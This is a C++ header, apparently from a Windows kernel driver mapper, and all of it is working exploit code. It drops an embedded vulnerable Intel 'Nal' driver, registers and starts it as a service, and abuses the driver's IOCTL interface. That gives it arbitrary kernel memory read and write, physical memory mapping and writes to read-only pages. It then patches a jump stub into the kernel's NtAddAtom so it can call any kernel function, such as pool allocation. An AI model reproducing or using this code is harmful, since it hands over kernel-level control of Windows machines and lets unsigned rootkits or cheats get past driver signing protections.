#ifndef intel_driver_hpp
#define intel_driver_hpp

namespace intel_driver {
	uint64_t ntoskrnl_address;
	constexpr uint32_t io_control_code{ 0x80862007 };

	typedef struct _COPY_MEMORY_BUFFER_INFO {
		uint64_t case_number;
		uint64_t unused;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYSICAL_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO {
		uint64_t case_number;
		uint64_t unused;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
		uint64_t case_number;
		uint64_t unused1;
		uint64_t unused2;
		uint64_t virt_address;
		uint64_t unused3;
		uint32_t number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

	bool is_running( ) {
		HANDLE file_handle{ CreateFileA( "\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr ) };
		if ( file_handle && file_handle != INVALID_HANDLE_VALUE ) {
			CloseHandle( file_handle );
			return true;
		}

		return false;
	}

	std::string get_driver_path( ) {
		std::string temp{ utils::get_temp_path( ) };
		if ( temp.empty( ) )
			return "";
		
		return temp + "\\" + service::driver_name;
	}

	bool unload( HANDLE device_handle ) {
		logger::log( logger::log_type_t::info, "unloading vulnerable driver" );

		if ( device_handle && device_handle != INVALID_HANDLE_VALUE )
			CloseHandle( device_handle );

		if ( !service::shutdown( ) )
			return false;

		std::string driver_path{ get_driver_path( ) };

		//if ( remove( driver_path.c_str( ) ) != 0 )
		//	return false;

		return true;
	}

	HANDLE load( ) {
		if ( is_running( ) ) {
			logger::log( logger::log_type_t::error, "\\Device\\Nal is already in use." );
			return INVALID_HANDLE_VALUE;
		}

		logger::log( logger::log_type_t::info, "loading vulnerable driver" );

		std::string driver_path{ get_driver_path( ) };
		if ( driver_path.empty( ) ) {
			logger::log( logger::log_type_t::error, "failed to get driver path" );
			return INVALID_HANDLE_VALUE;
		}

		remove( driver_path.c_str( ) );

		if ( !utils::create_file_from_memory( driver_path, reinterpret_cast< const char* >( driver ), sizeof driver ) ) {
			logger::log( logger::log_type_t::error, "failed to create vulnerable driver file" );
			return INVALID_HANDLE_VALUE;
		}

		if ( !service::register_service( driver_path ) ) {
			logger::log( logger::log_type_t::error, "failed to register service" );
			remove( driver_path.c_str( ) );
			return INVALID_HANDLE_VALUE;
		}

		if ( !service::start_service( ) ) {
			logger::log( logger::log_type_t::error, "failed to start service" );
			remove( driver_path.c_str( ) );
			return INVALID_HANDLE_VALUE;
		}

		HANDLE result = CreateFileW( L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); // хендл драйвера

		if ( !result || result == INVALID_HANDLE_VALUE ) {
			logger::log( logger::log_type_t::error, "failed to load vulnerable driver" );
			unload( result );
			return INVALID_HANDLE_VALUE;
		}

		ntoskrnl_address = utils::get_kernel_module_address( "ntoskrnl.exe" );
		if ( !ntoskrnl_address ) {
			logger::log( logger::log_type_t::error, "failed to get ntoskrnl.exe" );
			unload( result );
			return INVALID_HANDLE_VALUE;
		}

		logger::log( logger::log_type_t::info, std::format( "ntoskrnl {:#x}", ntoskrnl_address ) );

		return result;
	}

	bool mem_copy( HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size ) {
		if ( !destination || !source || !size )
			return false;

		COPY_MEMORY_BUFFER_INFO copy_memory_buffer{ };

		copy_memory_buffer.case_number = 0x33;
		copy_memory_buffer.source = source;
		copy_memory_buffer.destination = destination;
		copy_memory_buffer.length = size;

		DWORD bytes_returned{ };
		return DeviceIoControl( device_handle, io_control_code, &copy_memory_buffer, sizeof copy_memory_buffer, nullptr, 0, &bytes_returned, nullptr );
	}

	bool read_memory( HANDLE device_handle, uint64_t address, void* buffer, uint64_t size ) {
		return mem_copy( device_handle, reinterpret_cast< uint64_t >( buffer ), address, size );
	}
	bool write_memory( HANDLE device_handle, uint64_t address, void* buffer, uint64_t size ) {
		return mem_copy( device_handle, address, reinterpret_cast< uint64_t >( buffer ), size );
	}

	bool get_physical_address( HANDLE device_handle, uint64_t address, uint64_t* out_physical_address ) {
		if ( !address )
			return false;

		GET_PHYSICAL_ADDRESS_BUFFER_INFO get_physical_address_buffer{ };

		get_physical_address_buffer.case_number = 0x25;
		get_physical_address_buffer.address_to_translate = address;

		DWORD bytes_returned{ };

		if ( !DeviceIoControl( device_handle, io_control_code, &get_physical_address_buffer, sizeof get_physical_address_buffer, nullptr, 0, &bytes_returned, nullptr ) )
			return false;

		*out_physical_address = get_physical_address_buffer.return_physical_address;
		return true;
	}

	uint64_t map_io_space( HANDLE device_handle, uint64_t physical_address, uint32_t size ) {
		if ( !physical_address || !size )
			return 0;

		MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer{ };

		map_io_space_buffer.case_number = 0x19;
		map_io_space_buffer.physical_address_to_map = physical_address;
		map_io_space_buffer.size = size;

		DWORD bytes_returned{ };

		if ( !DeviceIoControl( device_handle, io_control_code, &map_io_space_buffer, sizeof( map_io_space_buffer ), nullptr, 0, &bytes_returned, nullptr ) )
			return 0;

		return map_io_space_buffer.return_virtual_address;
	}

	bool unmap_io_space( HANDLE device_handle, uint64_t address, uint32_t size ) {
		if ( !address || !size )
			return false;

		UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer{ };

		unmap_io_space_buffer.case_number = 0x1A;
		unmap_io_space_buffer.virt_address = address;
		unmap_io_space_buffer.number_of_bytes = size;

		DWORD bytes_returned{ };

		return DeviceIoControl( device_handle, io_control_code, &unmap_io_space_buffer, sizeof( unmap_io_space_buffer ), nullptr, 0, &bytes_returned, nullptr );
	}

	bool write_to_read_only_memory( HANDLE device_handle, uint64_t address, void* buffer, uint32_t size ) {
		if ( !address || !buffer || !size )
			return false;

		uint64_t physical_address;
		if ( !get_physical_address( device_handle, address, &physical_address ) )
			return false;

		uint64_t mapped_physical_memory{ map_io_space( device_handle, physical_address, size ) };

		if ( !mapped_physical_memory )
			return false;

		bool result = write_memory( device_handle, mapped_physical_memory, buffer, size );

		unmap_io_space( device_handle, mapped_physical_memory, size );

		return result;
	}

	uint64_t get_kernel_module_export( HANDLE device_handle, uint64_t kernel_module_base, const std::string function_name ) {
		if ( !kernel_module_base )
			return 0;

		IMAGE_DOS_HEADER dos_header{ };
		IMAGE_NT_HEADERS64 nt_headers{ };

		if ( !read_memory( device_handle, kernel_module_base, &dos_header, sizeof dos_header ) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
			!read_memory( device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof nt_headers ) || nt_headers.Signature != IMAGE_NT_SIGNATURE )
			return 0;

		DWORD export_base{ nt_headers.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress };
		DWORD export_base_size{ nt_headers.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size };

		if ( !export_base || !export_base_size )
			return 0;

		IMAGE_EXPORT_DIRECTORY* export_data = reinterpret_cast< IMAGE_EXPORT_DIRECTORY* >( VirtualAlloc( nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );

		if ( !read_memory( device_handle, kernel_module_base + export_base, export_data, export_base_size ) ) {
			VirtualFree( export_data, 0, MEM_RELEASE );
			return 0;
		}

		uint64_t delta = reinterpret_cast< uint64_t >( export_data ) - export_base;

		uint32_t* name_table{ reinterpret_cast< uint32_t* >( export_data->AddressOfNames + delta ) };
		uint16_t* ordinal_table{ reinterpret_cast< uint16_t* >( export_data->AddressOfNameOrdinals + delta ) };
		uint32_t* function_table{ reinterpret_cast< uint32_t* >( export_data->AddressOfFunctions + delta ) };

		for ( auto i{ 0 }; i < export_data->NumberOfNames; ++i ) {
			std::string current_function_name{ std::string( reinterpret_cast< char* >( name_table[ i ] + delta ) ) };

			if ( !_stricmp( current_function_name.c_str( ), function_name.c_str( ) ) ) {
				uint16_t function_ordinal{ ordinal_table[ i ] };
				if ( function_table[ function_ordinal ] <= 0x1000 )
					return 0;

				uint64_t function_address{ kernel_module_base + function_table[ function_ordinal ] };

				if ( function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size ) { // out of bound, function not export not found
					VirtualFree( export_data, 0, MEM_RELEASE );
					return 0;
				}

				VirtualFree( export_data, 0, MEM_RELEASE );
				return function_address;
			}
		}

		VirtualFree( export_data, 0, MEM_RELEASE );
		return 0;
	}

	template< typename T, typename ...A >
	bool call_kernel_function( HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments ) {
		constexpr auto call_void = std::is_same_v< T, void >; // check funtion is void

		if constexpr ( !call_void )
			if ( !out_result )
				return false;
		else 
			UNREFERENCED_PARAMETER( out_result ); 
		
		if ( !kernel_function_address )
			return false;

		HMODULE ntdll{ GetModuleHandleA( "ntdll.dll" ) };
		if ( !ntdll )
			return false;

		void* nt_add_atom{ reinterpret_cast< void* >( GetProcAddress( ntdll, "NtAddAtom" ) ) };
		if ( !nt_add_atom ) {
			logger::log( logger::log_type_t::error, "failed to get 'NtAddAtom'" );
			return false;
		}

		uint8_t kernel_injected_jmp[ ] { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[ sizeof kernel_injected_jmp ];
		*( uint64_t* )&kernel_injected_jmp[ 2 ] = kernel_function_address;

		static uint64_t kernel_nt_add_atom{ get_kernel_module_export( device_handle, ntoskrnl_address, "NtAddAtom" ) };
		if ( !kernel_nt_add_atom ) {
			logger::log( logger::log_type_t::error, "failed to get kernel 'NtAddAtom'" );
			return false;
		}

		// get memory for hook
		if ( !read_memory( device_handle, kernel_nt_add_atom, &original_kernel_function, sizeof kernel_injected_jmp ) )
			return false;

		// write shell code
		if ( !write_to_read_only_memory( device_handle, kernel_nt_add_atom, &kernel_injected_jmp, sizeof kernel_injected_jmp ) )
			return false;

		// call function
		if constexpr ( !call_void ) { // if function has return
			using fn_function = T( __stdcall* )( A... );
			auto function{ reinterpret_cast< fn_function >( nt_add_atom ) };

			*out_result = function( arguments... );
		}
		else { // if function void
			using fn_function = void( __stdcall* )( A... );
			auto function = reinterpret_cast< fn_function >( nt_add_atom );

			function( arguments... );
		}

		// restore the pointer
		write_to_read_only_memory( device_handle, kernel_nt_add_atom, original_kernel_function, sizeof kernel_injected_jmp );
		return true;
	}

	uint64_t allocate_pool( HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size ) {
		if ( !size )
			return false;

		static uint64_t kernel_ExAllocatePool = get_kernel_module_export( device_handle, intel_driver::ntoskrnl_address, "ExAllocatePoolWithTag" );
		if ( !kernel_ExAllocatePool ) 
			return false;

		uint64_t allocated_pool;
		if ( !call_kernel_function( device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE' ) )
			return false;

		return allocated_pool;
	}

	bool free_pool( HANDLE device_handle, uint64_t address ) {
		if ( !address )
			return false;

		static uint64_t kernel_ExFreePool = get_kernel_module_export( device_handle, intel_driver::ntoskrnl_address, "ExFreePool" );
		if ( !kernel_ExFreePool )
			return false;

		return call_kernel_function< void >( device_handle, nullptr, kernel_ExFreePool, address );
	}

}

#endif